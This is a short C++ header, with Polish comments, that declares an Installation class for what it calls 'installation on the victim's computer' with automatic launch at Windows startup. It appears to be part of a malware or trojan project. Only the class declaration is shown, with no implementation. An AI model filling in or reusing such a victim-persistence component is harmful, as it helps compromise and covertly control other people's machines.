#include "stdafx.h"
/*!
 * \class Installation
 *
 * \brief 
 * Instalacja na komputerze ofiary
 * automatyczne uruchomienie aplikacji
 * przy starcie systemu Windows
 * 
 * \author DualCore
 * \date grudzie� 2014
 */
class Installation
{
	bool isdestinationdirectory;
	void RegisterProgram();
public:
	bool IsDestinationDirectoryActive();
	Installation(); // Konstruktor przeprowadza pr�b� instalacji
};

